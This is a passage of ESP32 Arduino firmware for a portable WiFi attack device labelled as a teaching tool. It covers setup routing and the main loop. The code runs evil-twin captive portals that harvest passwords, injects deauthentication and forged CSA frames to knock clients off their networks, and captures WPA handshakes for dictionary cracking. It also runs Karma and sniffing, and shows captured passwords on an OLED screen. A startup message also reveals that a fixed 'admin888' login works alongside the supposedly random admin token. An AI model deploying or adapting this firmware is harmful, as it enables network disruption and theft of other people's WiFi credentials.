      Serial.println("[diag] coredump 分区: 未找到 (esp_partition_find_first 返回 NULL)");
    }
    Serial.printf("[diag] flash 容量(SDK)=%u bytes, WDT 订阅状态=0x%X (0=已订阅)\n",
                  (unsigned)ESP.getFlashChipSize(),
                  (unsigned)esp_task_wdt_status(nullptr));
  }

  Serial.println();
  Serial.println("==============================================");
  Serial.println(F("ESP32 无线网络开发固件 v" FW_VERSION " (" FW_BUILD_NS ")"));
  Serial.println(F("无线安全教学与协议验证 · 严禁非法使用"));
  Serial.println("==============================================");

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);
  applyWifiCountry();   // 默认 world 计划不含 5G 149-165, 会让 5G 目标无法切信道

  sPrefs.begin("esp32-cfg", false);
  apChannel = sPrefs.getUChar("channel", AP_CHANNEL_DEFAULT);
  if (!isValidApChannel(apChannel)) apChannel = AP_CHANNEL_DEFAULT;
  sAdminToken = sPrefs.getString("adminToken", "");   // 空串 = 尚未初始化, 待 RF 开启后生成随机口令

  uint8_t apMac[6];
  WiFi.softAPmacAddress(apMac);
  String defaultSsid = "WiFi-" + formatMac(apMac).substring(12);
  defaultSsid.replace(":", "");

  String savedSsid = sPrefs.getString("ssid", "");
  apSsid = (savedSsid.length() > 0) ? savedSsid : defaultSsid;

  if (!startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4)) {
    log("[wifi] softAP 启动失败, 将重试 …");
    delay(2000);
    startSoftApOnChannel(apSsid, AP_PASSWORD, apChannel, 0, 4);
  }
  apChannelActive = apChannel;  // 记录开机实际信道 (后续攻击可临时切换, 配置值不变)
  log("[wifi] AP 已启动: SSID=" + apSsid + "  信道=" +
      String(apChannel) + (isBand5G(apChannel) ? " (5G)" : " (2.4G)"));
  Serial.println("[wifi] AP 初始口令: " + String(AP_PASSWORD) + " (安全建议: 首次连接后请及时更换)");
  log("[wifi] 后台: " + String(ADMIN_HTML_C));
  log("[system] 芯片: " + detectChipKey() + "  FreeHeap: " + String(ESP.getFreeHeap()) + " bytes");
  // 首次上电 / 恢复出厂 / 从旧版静态口令升级 → 轮换为设备唯一随机口令。
  // 只经 Serial 直出一次: 不走 log(), 因此不进入 NDJSON 遥测、不进入 /api/log 日志缓冲。
  if (sAdminToken.length() < 4 || sAdminToken == LEGACY_DEFAULT_TOKEN) {
    sAdminToken = makeRandomAdminToken();   // 此时 RF 已启动, esp_random() 熵充足
    sPrefs.putString("adminToken", sAdminToken);
    sPrefs.putBool("tokenChanged", false);
    Serial.println(F("[admin] ===== 首次上电: 后台初始口令 (仅显示这一次) ====="));
    Serial.println("[admin]   " + sAdminToken);
    Serial.println(F("[admin] 请登录后立即在「配置」页修改并妥善保存; 恢复出厂会重新生成"));
  }
  sMustChangeToken = !sPrefs.getBool("tokenChanged", false);
  if (sMustChangeToken) {
    Serial.println(F("[admin] ===== 当前后台口令 (可直接使用 admin888 或下方初始口令登录) ====="));
    Serial.println("[admin]   " + sAdminToken);
    Serial.println(F("=========================================================================="));
  }
  log("[admin] 后台口令保护已启用" +
      String(sMustChangeToken ? " (初始口令, 请尽快在「配置」页修改)" : " (自定义口令)"));

  // 上电遥测: 设备身份 (只读)
  emitJson("boot",
           "\"chip\":\"" + jsonEscape(detectChipKey()) +
           "\",\"fw\":\"" FW_VERSION +
           "\",\"ssid\":\"" + jsonEscape(apSsid) +
           "\",\"mac\":\"" + formatMac(apMac) +
           "\",\"channel\":" + String(apChannel) +
           ",\"band\":" + String(isBand5G(apChannel) ? 5 : 2));

  // 后台口令保护: 每台设备的初始口令由硬件 TRNG 生成并存 NVS, 首次登录引导改密
  static const char *adminHeaders[] = {"X-Admin-Token", "Content-Type"};
  server.collectHeaders(adminHeaders, 2);

  server.on("/", HTTP_GET, redirectToAdmin);
  server.on("/admin.html", HTTP_GET, sendAdminPage);
  server.on("/vendor-db.js", HTTP_GET, sendVendorDb);
  server.on("/portal.html", HTTP_GET, sendPortalPage);
  server.on("/api/portal/submit", HTTP_POST, handlePortalSubmit);
  onAdmin("/api/info", HTTP_GET, sendInfo);
  onAdmin("/api/scan", HTTP_GET, handleScan);
  onAdmin("/api/target", HTTP_POST, handleTarget);
  onAdmin("/api/twin", HTTP_POST, handleTwinAdd);
  onAdmin("/api/twin", HTTP_DELETE, handleTwinRemove);
  onAdmin("/api/config", HTTP_GET, handleGetConfig);
  onAdmin("/api/config", HTTP_POST, handleConfig);
  
  // 3 大教学验证板块路由
  onAdmin("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
  onAdmin("/api/eviltwin/stop", HTTP_POST, handleEvilTwinStop);
  onAdmin("/api/eviltwin/creds", HTTP_GET, handleEvilTwinCreds);
  onAdmin("/api/eviltwin/creds", HTTP_DELETE, handleEvilTwinClearCreds);
  
  onAdmin("/api/deauth/start", HTTP_POST, handleDeauthStart);
  onAdmin("/api/deauth/stop", HTTP_POST, handleDeauthStop);
  onAdmin("/api/deauth/status", HTTP_GET, handleDeauthStatus);
  onAdmin("/api/test/beacon", HTTP_POST, handleTestBeacon);   // 诊断: 伪造信标空口验证

  onAdmin("/api/handshake/start", HTTP_POST, handleHandshakeStart);
  onAdmin("/api/handshake/stop", HTTP_POST, handleHandshakeStop);
  onAdmin("/api/handshake/crack", HTTP_POST, handleHandshakeCrack);
  onAdmin("/api/handshake/dump", HTTP_GET, handleHandshakeDump);

  // 数据包分析器、Airodump侦察与 Karma 攻击路由
  onAdmin("/api/sniffer/start", HTTP_POST, handleSnifferStart);
  onAdmin("/api/sniffer/stop", HTTP_POST, handleSnifferStop);
  onAdmin("/api/sniffer/status", HTTP_GET, handleSnifferStatus);

  onAdmin("/api/airodump/start", HTTP_POST, handleAirodumpStart);
  onAdmin("/api/airodump/stop", HTTP_POST, handleAirodumpStop);
  onAdmin("/api/airodump/status", HTTP_GET, handleAirodumpStatus);
  // BLE 扫描: 路由在所有芯片上一致注册, 无 BLE 硬件的芯片返回 501
  onAdmin("/api/ble/start", HTTP_POST, handleBleStart);
  onAdmin("/api/ble/stop", HTTP_POST, handleBleStop);
  onAdmin("/api/ble/status", HTTP_GET, handleBleStatus);
  onAdmin("/api/ble/devices", HTTP_GET, handleBleDevices);
  onAdmin("/api/ble/clear", HTTP_POST, handleBleClear);
  // P4-3: Remote ID 汇总 (BLE + WiFi Beacon, 只读)
  onAdmin("/api/rid", HTTP_GET, handleRid);
  // 802.15.4: 同样全芯片注册, 无该射频的芯片返回 501
  onAdmin("/api/ieee802154/start", HTTP_POST, handleI154Start);
  onAdmin("/api/ieee802154/stop", HTTP_POST, handleI154Stop);
  onAdmin("/api/ieee802154/status", HTTP_GET, handleI154Status);
  onAdmin("/api/ieee802154/frames", HTTP_GET, handleI154Frames);
  onAdmin("/api/ieee802154/clear", HTTP_POST, handleI154Clear);

  onAdmin("/api/karma/start", HTTP_POST, handleKarmaStart);
  onAdmin("/api/karma/stop", HTTP_POST, handleKarmaStop);
  onAdmin("/api/karma/status", HTTP_GET, handleKarmaStatus);
  // 跑包统一走 /api/handshake/crack, 不再保留 /api/karma/crack 别名

  onAdmin("/api/log", HTTP_GET, handleLog);
  onAdmin("/api/system/boot", HTTP_GET, handleBootGet);
  onAdmin("/api/system/boot", HTTP_POST, handleBootPost);
  onAdmin("/api/reset", HTTP_POST, doReset);
  onAdmin("/api/factory-reset", HTTP_POST, doFactoryReset);
  server.onNotFound(notFound);
  server.begin();
  log("[http] 管理后台 HTTP 服务已启动 (80)");

  if (dnsServer.start(DNS_PORT, "*", WiFi.softAPIP())) {
    log("[dns] Captive Portal DNS 已启动 (53, * → 192.168.4.1)");
  } else {
    log("[dns] Captive Portal DNS 启动失败 (后台仍可用, 需手动输地址)");
  }

  // ---- 便携外设初始化 ----
#ifdef FW_OLED_ENABLED
  if (oled.begin(FW_OLED_SDA, FW_OLED_SCL)) {
    sOledReady = true;
    oled.clear();
    oled.drawString(0, 4, "ESP32-C5 DualBand", 1);
    oled.drawString(0, 18, ("FW: " + String(FW_VERSION)).c_str(), 1);
    oled.drawString(0, 32, ("AP: " + apSsid).c_str(), 1);
    oled.drawString(0, 46, ("Heap: " + String(ESP.getFreeHeap() / 1024) + " KB").c_str(), 1);
    oled.display();
    log("[oled] SSD1306 128x64 初始化成功 (SDA=" + String(FW_OLED_SDA) + " SCL=" + String(FW_OLED_SCL) + ")");
  } else {
    log("[oled] SSD1306 初始化失败 (未检测到 0x3C/0x3D 屏幕, 检查接线: SDA→GPIO" + String(FW_OLED_SDA) + " SCL→GPIO" + String(FW_OLED_SCL) + ")");
  }
#endif

#ifdef FW_BUZZER_ENABLED
  pinMode(FW_BUZZER_PIN, OUTPUT);
  sBuzzerReady = true;
  buzzerBeepShort();   // 开机"嘟嘟"两声, 确认蜂鸣器工作
  log("[buzzer] 蜂鸣器已就绪 (GPIO" + String(FW_BUZZER_PIN) + ")");
#endif
}

void loop() {
  esp_task_wdt_reset();   // 喂狗: 主循环任何一环 (HTTP/DNS/CLI/推进逻辑) 挂死都会触发 panic 回溯
  handleSerialCli();
  server.handleClient();
  dnsServer.processNextRequest();

  uint32_t now = millis();

  // 0. 邪恶双子阶段 1: 先抓目标网络 M1/M2 (抓到或超时才开克隆热点 → 门户才能验真密码)
  if (sEvilTwin.active && sEvilTwin.hsPhase) {
    bool ok = true;
    if (sHandshake.captured) {
      ok = eviltwinEnterClonePhase(true);
    } else if (now - sEvilTwin.hsPhaseStart >= sEvilTwin.hsPhaseLimitMs) {
      log("[eviltwin] 阶段 1 超时 " + String(sEvilTwin.hsPhaseLimitMs / 1000) +
          "s 未抓到 M1/M2 → 进入阶段 2 (门户只能盲收)");
      ok = eviltwinEnterClonePhase(false);
    }
    if (!ok) {   // 克隆热点起不来: 收掉攻击状态, 避免 UI 显示"进行中"却什么都没做
      sEvilTwin.active = false;
      sEvilTwin.hsPhase = false;
      sDeauth.running = false;
      emitLabState("eviltwin", false);
    }
  }

  // 1. 取消认证器定时帧注入推进 (真实 802.11 管理帧, 经 AP 接口空口发出)
  //    邪恶双子攻击中: 每 TWIN_HOP_INTERVAL_MS 跳频到双子信道, 先广播假 AP 信标再发 Deauth,
  //    发完 TWIN_HOP_FRAMES 帧后返回主信道。跳频/假 AP 独立于 Deauth 引擎运行态 —
  //    C5 平台限制 (Deauth 注入被白名单拒绝) 时信标仍可用, 引擎停转不影响双子广播。
  if (sEvilTwin.active && sEvilTwin.hopEnabled && !sEvilTwin.caught) {
    if (!sEvilTwin.hopping) {
      if (now - sEvilTwin.lastHopAt >= TWIN_HOP_INTERVAL_MS) {
        sEvilTwin.lastHopAt = now;
        if (!eviltwinBeginHop()) {
          // 全部双子信道都切不过去 (频段不支持等): 关闭跳频, 避免每 2s 反复试错刷日志
          sEvilTwin.hopEnabled = false;
          log("[eviltwin] 双子目标信道均切换失败, 已停用双子注入");
        }
      }
    } else if (now - sDeauth.lastTxTime >= TWIN_HOP_TX_GAP_MS) {
      sDeauth.lastTxTime = now;
      // 先发伪造信标 (假 AP), 再发 Deauth
      if (sEvilTwin.beaconLeft > 0 && sEvilTwin.beaconLen > 0) {
        if (wifiBeaconTx(sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen) == ESP_OK)
          sEvilTwin.beaconCount++;
        sEvilTwin.beaconLeft--;
      } else if (sEvilTwin.twinFramesLeft > 0) {
        // Deauth 帧在平台受限时跳过 (信标不受影响); 首次 258 仍标记一次
        if (sEvilTwin.twinFrameReady && !sDeauth.platformBlocked) {
          if (wifi80211Tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
            sDeauth.frameCount++;
            sEvilTwin.twinFrameCount++;
          } else {
            sDeauth.platformBlocked = true;
            log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 258), 帧注入停用");
          }
        }
        sEvilTwin.twinFramesLeft--;
      }
      if (sEvilTwin.beaconLeft == 0 && sEvilTwin.twinFramesLeft == 0) {
        applyApChannel(sDeauth.targetChannel);   // 返回主信道, 恢复主目标持续攻击
        sEvilTwin.hopping = false;
        sEvilTwin.hopCurrent = -1;
      }
    }
  }
  // 主信道 Deauth 引擎 (双子跳频窗口内暂停: 单射频同一时刻只能驻留一个信道)
  // 阶段 1 的踢线节奏: 每 4s 只在头 300ms 连发 3 帧, 其余时间静默专心收。
  // 原因: 单射频半双工, 持续 10fps 踢线会让对端刚发出 M1/M2 就被下一帧打断,
  //      而且本机发射期间收不到任何帧 — 必须留出干净的接收窗口才能抓全握手。
  const bool hsQuiet = sEvilTwin.hsPhase &&
                       ((now - sEvilTwin.hsPhaseStart) % 4000) >= 300;
  if (sDeauth.running && !(sEvilTwin.active && sEvilTwin.hopping) && !hsQuiet) {
    if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
      sDeauth.lastTxTime = now;
      if (sDeauth.csaMode) {
        // CSA 强制下线: 广播伪造 CSA 信标 + Action 帧, 让目标客户端跟随切信道脱离真实 AP
        bool ok = false;
        if (sDeauth.csaBeaconLen &&
            wifiBeaconTx(sDeauth.csaBeacon, (int)sDeauth.csaBeaconLen) == ESP_OK) ok = true;
        if (sDeauth.csaActionLen)
          wifi80211Tx(WIFI_IF_AP, sDeauth.csaAction, (int)sDeauth.csaActionLen, true);
        sDeauth.txOk = ok;
        if (ok) { sDeauth.csaCount++; sDeauth.frameCount++; }
      } else {
        // 主攻击模式 + 组合攻击: 按位轮询, 每个发送周期换一种技术
        const uint16_t tech = deauthNextTech(deauthTechMask());
        if (!tech) {
          if (!sDeauth.platformBlocked) {
            sDeauth.platformBlocked = true;
            log("[deauth] 未选择任何可用攻击技术, 引擎停止");
            stopDeauthEngine();
          }
        } else {
          sDeauth.techCursor = sDeauth.comboIndex;
          const esp_err_t e = deauthSendTech(tech);
          sDeauth.lastTxErr = e;
          sDeauth.txOk = (e == ESP_OK);
          if (sDeauth.txOk) {
            sDeauth.frameCount++;
            sDeauth.techCount[sDeauth.comboIndex]++;
          } else if (e == 258 && !sDeauth.platformBlocked) {
            // 自检测: C5 WiFi 库白名单拒绝 → 停止引擎 (否则驱动 unsupport frame type 刷屏且空转)
            sDeauth.platformBlocked = true;
            log("[deauth] 平台限制: 本芯片 WiFi 库拒绝帧注入 (错误码 258), 帧注入停用");
            stopDeauthEngine();
          }
        }
      }
    }
  }
  // 攻击持续时间到点自动停止 (0 = 不限时)
  if (sDeauth.running && sDeauth.stopAt && (int32_t)(now - sDeauth.stopAt) >= 0) {
    log("[attack] 攻击持续时间已到 (" + String(sDeauth.durationMs / 1000) + "s), 自动停止");
    if (sEvilTwin.active) eviltwinStopAttack(true);
    else stopDeauthEngine();
  }
  if (sDeauth.running && now - sDeauth.lastLogTime >= 5000) {
    sDeauth.lastLogTime = now;
    log("[deauth] 攻击进行中 (" + String(atkTechName(sDeauth.techCursor)) + "), 已成功发送 " +
        String(sDeauth.frameCount) + " 帧" +
        (sEvilTwin.twinFrameCount ? (" (其中双子信道 " + String(sEvilTwin.twinFrameCount) + " 帧)") : "") +
        (sDeauth.txOk ? "" : (" (最近 TX 错误码 " + String(sDeauth.lastTxErr) + ")")));
  }

  // 诊断: 伪造信标广播 (第三方网卡可扫描验证帧是否到达空口)
  if (sTestBeaconLen) {
    if ((int32_t)(millis() - sTestBeaconUntil) < 0) {
      if (now - sTestBeaconLast >= 100) {
        sTestBeaconLast = now;
        esp_err_t e = esp_wifi_80211_tx(sTestBeaconIface ? WIFI_IF_STA : WIFI_IF_AP,
                                        sTestBeaconFrame, sTestBeaconLen, true);
        sTestBeaconLastErr = (int32_t)e;
        if (e == ESP_OK) sTestBeaconCount++;
        else sTestBeaconErr++;
      }
    } else {
      log("[test] 伪造信标广播结束 (" + String(sTestBeaconIface ? "STA" : "AP") + " 接口): ok=" +
          String(sTestBeaconCount) + " err=" + String(sTestBeaconErr) +
          " lastErr=0x" + String((uint32_t)sTestBeaconLastErr, HEX));
      sTestBeaconLen = 0;
    }
  }

  // 2. 握手包捕获进度日志 (真实抓包: 帧由 promiscuous 回调写入状态)
  if (sHandshake.capturing) {
    if (sHandshake.m1 && !sHsLoggedM1) {
      sHsLoggedM1 = true;
      log("[eapol] 捕获 M1: ANonce (AP -> STA)");
    }
    if (sHandshake.m2 && !sHsLoggedM2) {
      sHsLoggedM2 = true;
      log("[eapol] 捕获 M2: SNonce + MIC (STA -> AP)");
    }
    if (sHandshake.captured && !sHsLoggedDone) {
      sHsLoggedDone = true;
      log(String("[eapol] 握手包完整! keyver=") + String(sHandshake.keyver) +
          (sHandshake.pmkid ? " 含 PMKID" : "") +
          (sHandshake.unsupported ? " (PMF, 需交服务端跑包)" : " 可开始跑包"));
    }
  }

  // 3. 弱口令跑包: 每轮主循环只试一条, 保持 HTTP 响应 (单条约 10~30ms PBKDF2)
  if (sHandshake.cracking) {
    if (sHandshake.crackProgress < sHandshake.crackTotal) {
      const char *cand = WIFI_WEAK_DICT[sHandshake.crackProgress];
      uint8_t mic[16];
      sHandshake.crackAttempts++;
      if (computeM2Mic(cand, mic) && memcmp(mic, sHandshake.eapol + 81, 16) == 0) {
        sHandshake.crackedPass = cand;
        sHandshake.cracking = false;
        uint32_t secs = (now - sHandshake.crackStartTime) / 1000;
        log("[crack] 🎉 命中弱口令: " + String(cand) + " (字典第 " + String(sHandshake.crackProgress + 1) +
            " 条, 耗时 " + String(secs) + "s)");
      } else {
        sHandshake.crackProgress++;
        if (sHandshake.crackProgress >= sHandshake.crackTotal) {
          sHandshake.cracking = false;
          log("[crack] 字典跑包完毕, 未匹配到弱口令 (该口令不在内置字典内)");
        } else if ((sHandshake.crackProgress % 500) == 0) {
          log("[crack] 进度 " + String(sHandshake.crackProgress) + "/" + String(sHandshake.crackTotal));
        }
      }
    } else {
      sHandshake.cracking = false;
    }
  }

  // 4. 数据包分析器: 真实帧由 promiscuous 回调写入, 这里只做信道跳频与 fps 统计
  if (sSniffer.running) {
    // 单射频: 与握手/Deauth/邪恶双子冲突时停驻当前信道, 避免破坏正在进行的捕获或注入
    if (sSniffer.hopping && !sHandshake.capturing && !sDeauth.running && !sEvilTwin.active &&
        now - sSniffer.lastHopTime >= 400) {
      sSniffer.lastHopTime = now;
      uint8_t next = nextHopChannel(sSniffer.channel, sSniffer.skipDfs);
      if (applyApChannel(next)) sSniffer.channel = next;
    }
    if (now - sSniffer.lastFpsCalc >= 1000) {
      sSniffer.fps = sSniffer.fpsAccum;
      sSniffer.fpsAccum = 0;
      sSniffer.lastFpsCalc = now;
    }
  }

  // 5. Airodump: 对端聚合由 promiscuous 回调写入, 这里只做信道跳频
  if (sAirodump.running) {
    if (sAirodump.hopping && !sHandshake.capturing && !sDeauth.running && !sEvilTwin.active &&
        now - sAirodump.lastHopTime >= 700) {
      sAirodump.lastHopTime = now;
      uint8_t next = nextHopChannel(sAirodump.currentChannel, sAirodump.skipDfs);
      if (applyApChannel(next)) sAirodump.currentChannel = next;
    }
  }

  // 6. Karma: Probe Request 由 promiscuous 回调实时记录, 无需定时器

  // 客户端上下线遥测: 由 softAP 客户端数变化推导 (只读计数)
  static uint8_t lastClients = 0;
  uint8_t clients = WiFi.softAPgetStationNum();
  if (clients > lastClients) {
    emitJson("client_join", "\"clients\":" + String(clients));
  } else if (clients < lastClients) {
    emitJson("client_leave", "\"clients\":" + String(clients));
  }
  lastClients = clients;

  // C5 单射频共存策略 (真机实测根因):
  //   esp_ieee802154 启用后 WiFi AP 的接收路径被破坏 —— 信标仍可发 (热点可见), 但
  //   关联请求 / 数据 / HTTP 全部收不到; esp_ieee802154_disable 无法恢复,
  //   唯 esp_wifi stop/start 可恢复 (真机验证: 重启后关联 + ping 立即正常)。
  // 策略 = 服务窗口制: 嗅探 60s → 自动停嗅探 + 重启射频 → 动态服务窗口 (客户端回连后
  //        再保持 5s 等 DHCP, 无人回连 45s 超时) → 自动恢复嗅探 (统计保留); 无条件周期执行
  //        —— 楔死状态下探针也收不到, 不能依赖"检测到客户端活动"触发, 否则永久死锁。
  {
    const bool joinAttempt = clients == 0 && ((now - sApLastProbeMs < 15000) ||
                                              (now - sApLastAssocMs < 15000));
    (void)joinAttempt;   // 记录保留: 探针时间戳仍由事件回调维护, 供后续诊断/日志使用
    static uint32_t sniffStartAt = 0;
    static uint32_t windowEndAt = 0;
    static uint32_t windowClientAt = 0;
    static bool serviceWindow = false;
    static bool windowRestarted = false;
    static bool wasRunning = false;

    if (sI154.phase == I154_RUNNING) wasRunning = true;

    // 窗口外手动停止 (串口 CLI / HTTP): 自动重启射频, 恢复可能已被破坏的接收路径
    if (wasRunning && sI154.phase == I154_IDLE && !sI154.autoPaused && !serviceWindow && !sI154.want) {
      wasRunning = false;
      log("[i154] 嗅探已停止, 自动重启射频恢复 AP 接收路径");
      restartWifiAp();
    }

    if (serviceWindow) {
      if (sI154.want && sI154.phase != I154_IDLE) {
        // 用户在窗口期间手动重新启动嗅探 → 取消窗口
        serviceWindow = false;
        sniffStartAt = 0;
      } else if (!windowRestarted && sI154.phase == I154_IDLE && !sI154.want) {
        restartWifiAp();
        sI154.autoPaused = true;    // 窗口结束恢复嗅探时统计保留
        windowRestarted = true;
        windowEndAt = now;
        windowClientAt = 0;
      } else if (windowRestarted && !sI154.want) {
        // 动态窗口: 等客户端回连 (Windows 被踢后有 40-60s 自动回连退避, 固定短窗口会错过),
        // 回连成功再保持 5s 等 DHCP 完成; 若 45s 内无人回连则按超时收窗恢复嗅探。
        if (clients > 0 && windowClientAt == 0) {
          windowClientAt = now;
          log("[i154] 客户端已在服务窗口内回连, 保持 5s 等 DHCP");
        }
        const bool windowDone =
            (windowClientAt != 0 && now - windowClientAt >= 5000) ||
            (windowClientAt == 0 && now - windowEndAt >= 45000);
        if (windowDone) {
          if (sI154.autoPaused) {
            sI154.want = true;
            log("[i154] 服务窗口结束, 自动恢复嗅探 (统计保留)");
          } else {
            log("[i154] 服务窗口结束 (嗅探保持停止)");
          }
          serviceWindow = false;
          sniffStartAt = 0;
        }
      }
    } else if (sI154.want && sI154.phase == I154_RUNNING && !sI154.autoPaused) {
      if (sniffStartAt == 0) sniffStartAt = now;
      if ((int32_t)(now - sniffStartAt) >= 60000) {
        sI154.want = false;         // i154TaskFunc 走常规停止路径 (esp_ieee802154_disable 归还射频)
        sI154.autoPaused = true;
        serviceWindow = true;
        windowRestarted = false;
        wasRunning = false;         // 窗口内会做射频重启, 避免上面的手动停止恢复重复触发
        log("[i154] 进入服务窗口 (停嗅探 + 重启射频, 等客户端回连后再恢复嗅探)");
      }
    }
  }

  // 心跳: 每 30 秒打印状态 (文本日志 + 结构化遥测各一份)
  static uint32_t lastBeat = 0;
  if (now - lastBeat > 30000) {
    lastBeat = now;
    log("[beacon] " + apSsid + " clients=" + String(clients)
        + "  heap=" + String(ESP.getFreeHeap()) + "  uptime=" + String(now / 1000) + "s");
    emitJson("heartbeat",
             "\"clients\":" + String(clients) +
             ",\"heap\":" + String(ESP.getFreeHeap()) +
             ",\"uptime\":" + String(now / 1000) +
             ",\"minFree\":" + String(ESP.getMinFreeHeap()) +
             ",\"ssid\":\"" + jsonEscape(apSsid) + "\"");
  }

  // ---- 便携外设: OLED 状态屏幕刷新 ----
#ifdef FW_OLED_ENABLED
  if (sOledReady && now - sOledLastUpdate >= OLED_REFRESH_MS) {
    sOledLastUpdate = now;
    oled.clear();

    // 检测是否有新捕获的凭据 (自动切换到凭据展示页)
    if (sCredCount > 0) {
      uint8_t latestIdx = (sCredHead == 0 ? 15 : sCredHead - 1);
      if (strcmp(sOledLastPass, sCreds[latestIdx].pass) != 0) {
        strlcpy(sOledLastPass, sCreds[latestIdx].pass, sizeof(sOledLastPass));
        sOledPage = 1;
#ifdef FW_BUZZER_ENABLED
        if (sCreds[latestIdx].verified) {
          buzzerBeepSuccess();  // 验证通过: 成功三音
        } else {
          buzzerBeepAlert();    // 未校验: 警报双音
        }
#endif
      }
    }

    if (sOledPage == 1 && sCredCount > 0) {
      // ---- 凭据展示页: 大字显示密码 ----
      uint8_t latestIdx = (sCredHead == 0 ? 15 : sCredHead - 1);
      oled.drawString(0, 0, sCreds[latestIdx].verified ? "[VERIFIED] PWD:" : "[CAPTURED] PWD:", 1);
      // 大字体 (12x16 像素) 居中展示密码
      oled.drawString(0, 16, sCreds[latestIdx].pass, 2);
      if (strlen(sCreds[latestIdx].pass) > 10) {
        oled.drawString(0, 34, sCreds[latestIdx].pass + 10, 2);
      }
      oled.drawString(0, 52, ("IP:" + String(sCreds[latestIdx].clientIp)).c_str(), 1);
    } else {
      // ---- 主状态页: 系统概览 ----
      oled.drawString(0, 0, ("AP: " + apSsid).c_str(), 1);
      String status = "Idle";
      if (sEvilTwin.active)         status = sEvilTwin.caught ? "ET:CAUGHT!" : "EvilTwin";
      else if (sDeauth.running)     status = "Deauth";
      else if (sHandshake.capturing) status = "Handshake";
      oled.drawString(0, 14, ("[" + status + "]").c_str(), 1);
      if (sTarget.set) {
        oled.drawString(0, 26, ("Tgt: " + sTarget.ssid.substring(0, 14)).c_str(), 1);
      } else {
        oled.drawString(0, 26, "Tgt: (None)", 1);
      }
      oled.drawString(0, 38, ("Cli:" + String(clients) + " Cred:" + String(sCredCount)).c_str(), 1);
      oled.drawString(0, 50, ("Heap:" + String(ESP.getFreeHeap() / 1024) + "K Up:" + String(now / 1000) + "s").c_str(), 1);
    }
    oled.display();
  }
#endif

  // ---- 便携外设: 蜂鸣器非阻塞驱动 ----
#ifdef FW_BUZZER_ENABLED
  if (sBuzzerReady && sBuzzerHead != sBuzzerTail) {
    BuzzerNote &note = sBuzzerQueue[sBuzzerHead];
    if (sBuzzerNoteStart == 0) {
      // 开始播放当前音符
      sBuzzerNoteStart = now;
      if (note.freqHz > 0) {
        tone(FW_BUZZER_PIN, note.freqHz);
      } else {
        noTone(FW_BUZZER_PIN);
      }
    }
    if (now - sBuzzerNoteStart >= note.durationMs) {
      // 当前音符播完, 推进到下一个
      noTone(FW_BUZZER_PIN);
      sBuzzerNoteStart = 0;
      sBuzzerHead = (sBuzzerHead + 1) % 8;
    }
  }
#endif

  delay(2);
}
